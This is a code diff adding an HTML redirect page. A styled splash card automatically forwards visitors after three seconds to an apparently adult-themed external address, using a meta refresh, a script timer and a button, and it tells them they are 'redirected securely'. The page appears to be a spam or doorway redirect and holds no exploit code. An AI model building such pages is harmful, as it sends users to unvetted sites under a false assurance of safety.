@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecting...</title>
+
+  <!-- Auto Redirect -->
+  <meta http-equiv="refresh" content="3;url=https://teen18.vercel.app/Q.html">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial, sans-serif;
+    }
+
+    body{
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:linear-gradient(135deg,#111827,#1f2937,#000);
+      overflow:hidden;
+      color:white;
+    }
+
+    .card{
+      width:90%;
+      max-width:400px;
+      background:rgba(255,255,255,0.08);
+      border:1px solid rgba(255,255,255,0.1);
+      backdrop-filter:blur(15px);
+      border-radius:25px;
+      padding:35px 25px;
+      text-align:center;
+      box-shadow:0 10px 40px rgba(0,0,0,0.5);
+      animation:fadeIn 1s ease;
+    }
+
+    .logo{
+      width:90px;
+      height:90px;
+      margin:auto;
+      border-radius:50%;
+      background:linear-gradient(45deg,#ff0055,#ff7b00);
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-size:40px;
+      font-weight:bold;
+      margin-bottom:20px;
+      animation:pulse 2s infinite;
+    }
+
+    h1{
+      font-size:28px;
+      margin-bottom:10px;
+    }
+
+    p{
+      color:#d1d5db;
+      font-size:15px;
+      margin-bottom:25px;
+    }
+
+    .loader{
+      width:70px;
+      height:70px;
+      border:6px solid rgba(255,255,255,0.15);
+      border-top:6px solid #ff0055;
+      border-radius:50%;
+      margin:20px auto;
+      animation:spin 1s linear infinite;
+    }
+
+    .btn{
+      display:inline-block;
+      margin-top:10px;
+      padding:12px 28px;
+      border-radius:50px;
+      text-decoration:none;
+      color:white;
+      background:linear-gradient(45deg,#ff0055,#ff7b00);
+      font-weight:bold;
+      transition:0.3s;
+    }
+
+    .btn:hover{
+      transform:scale(1.05);
+      box-shadow:0 0 20px rgba(255,0,85,0.5);
+    }
+
+    @keyframes spin{
+      100%{
+        transform:rotate(360deg);
+      }
+    }
+
+    @keyframes pulse{
+      0%{
+        transform:scale(1);
+      }
+      50%{
+        transform:scale(1.08);
+      }
+      100%{
+        transform:scale(1);
+      }
+    }
+
+    @keyframes fadeIn{
+      from{
+        opacity:0;
+        transform:translateY(20px);
+      }
+      to{
+        opacity:1;
+        transform:translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">↗</div>
+
+    <h1>Redirecting...</h1>
+
+    <p>
+      Please wait a moment.<br>
+      You are being redirected securely.
+    </p>
+
+    <div class="loader"></div>
+
+    <a class="btn" href="https://teen18.vercel.app/Q.html">
+      Continue Now
+    </a>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://teen18.vercel.app/Q.html";
+    }, 3000);
+  </script>
+
+</body>
+</html>
